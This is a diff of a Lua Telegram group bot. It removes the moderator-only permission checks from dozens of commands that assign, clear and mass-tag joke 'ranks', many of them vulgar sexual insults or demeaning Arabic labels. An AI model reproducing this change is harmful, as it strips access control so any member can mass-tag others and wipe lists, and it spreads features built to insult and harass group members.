+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -9027,16 +9101,12 @@ return false
 end
 
 if (text == ("تنزيل قرد")) and msg.reply_to_message_id_ then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -9053,18 +9123,10 @@ return false
 end
 -----------------------------------------------------
 if text == 'تنزيل الضلوع' then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 database:del(bot_id..'Bro:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم تنزيل جميع الضلوع بالجروب')
 end
 if text == ("تاك للضلوع") then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 local list = database:smembers(bot_id..'Bro:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة الضلوع الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -9082,16 +9144,12 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع ضلع") and tonumber(msg.reply_to_message_id_) ~= 0 then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -9112,16 +9170,12 @@ return false
 end
 
 if (text == ("تنزيل ضلع")) and msg.reply_to_message_id_ then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -9138,18 +9192,10 @@ return false
 end
 -----------------------------------------------------
 if text == 'مسح النسوان' then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 database:del(bot_id..'Girl:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم مسح كل النسوان بالجروب')
 end
 if text == ("تاك للنسوان") then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 local list = database:smembers(bot_id..'Girl:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة نسوان الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -9167,16 +9213,12 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع مره") and tonumber(msg.reply_to_message_id_) ~= 0 then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -9197,16 +9239,12 @@ return false
 end
 
 if (text == ("تنزيل مره")) and msg.reply_to_message_id_ then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -9223,18 +9261,10 @@ return false
 end
 -----------------------------------------------------
 if text == 'مسح المتناكين' then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 database:del(bot_id..'Nek:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم مسح كل متناكين الجروب')
 end
 if text == ("تاك للمتناكين") then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 local list = database:smembers(bot_id..'Nek:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة متناكين الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -9252,16 +9282,12 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع علي زبي") and tonumber(msg.reply_to_message_id_) ~= 0 then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -9282,16 +9308,12 @@ return false
 end
 
 if (text == ("تنزيل من زبي")) and msg.reply_to_message_id_ then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -9308,18 +9330,10 @@ return false
 end
 -----------------------------------------------------
 if text == 'مسح الاكساس' then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 database:del(bot_id..'kss:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم مسح كل الاكساس بالجروب')
 end
 if text == ("تاك للاكساس") then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 local list = database:smembers(bot_id..'kss:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة اكساس الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -9337,16 +9351,12 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع كس") and tonumber(msg.reply_to_message_id_) ~= 0 then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -9367,16 +9377,12 @@ return false
 end
 
 if (text == ("تنزيل كس")) and msg.reply_to_message_id_ then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -9393,18 +9399,10 @@ return false
 end
 -----------------------------------------------------
 if text == 'تنزيل البقرات' then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 database:del(bot_id..'Bakra:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم تنزيل جميع البقرات بالجروب')
 end
 if text == ("تاك للبقرات") then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 local list = database:smembers(bot_id..'Bakra:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة البقرات الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -9422,16 +9420,12 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع بقره") and tonumber(msg.reply_to_message_id_) ~= 0 then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -9452,16 +9446,12 @@ return false
 end
 
 if (text == ("تنزيل بقره")) and msg.reply_to_message_id_ then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -9478,18 +9468,10 @@ return false
 end
 -----------------------------------------------------
 if text == 'تنزيل الطليان' then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 database:del(bot_id..'Tele:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم تنزيل جميع طليان بالجروب')
 end
 if text == ("تاك للطليان") then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 local list = database:smembers(bot_id..'Tele:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة الطليان الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -9507,16 +9489,12 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع طلي") and tonumber(msg.reply_to_message_id_) ~= 0 then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -9537,16 +9515,12 @@ return false
 end
 
 if (text == ("تنزيل طلي")) and msg.reply_to_message_id_ then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -9563,18 +9537,10 @@ return false
 end
 -----------------------------------------------------
 if text == 'مسح الحكاكين' then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 database:del(bot_id..'Zahf:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم مسح كل الحكاكين')
 end
 if text == ("تاك للحكاكين") then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة حكاكين الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -9592,16 +9558,12 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع حكاك") and tonumber(msg.reply_to_message_id_) ~= 0 then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -9622,16 +9584,12 @@ return false
 end
 
 if (text == ("تنزيل حكاك")) and msg.reply_to_message_id_ then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -9648,18 +9606,10 @@ return false
 end
 -----------------------------------------------------
 if text == 'تنزيل خنزيره' then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 database:del(bot_id..'Jred:User'..msg.chat_id_)
 send(msg.chat_id_, msg.id_, ' ☉┇ تم تنزيل جميع جريزي')
 end
 if text == ("تاك للخنازير") then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 local list = database:smembers(bot_id..'Jred:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة خنازير الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -9677,16 +9627,12 @@ send(msg.chat_id_, msg.id_, t)
 end
 ---------
 if text == ("رفع خنزير") and tonumber(msg.reply_to_message_id_) ~= 0 then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -9707,16 +9653,12 @@ return false
 end
 
 if (text == ("تنزيل خنزير")) and msg.reply_to_message_id_ then
-if not Mod(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
-return false
-end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -9766,7 +9708,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -9852,7 +9794,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -9902,7 +9844,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -9930,7 +9872,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -9961,7 +9903,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -10023,7 +9965,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -10057,7 +9999,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -10169,7 +10111,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -10208,7 +10150,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -10230,7 +10172,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -10256,7 +10198,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -10284,7 +10226,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -10315,7 +10257,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -10426,7 +10368,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
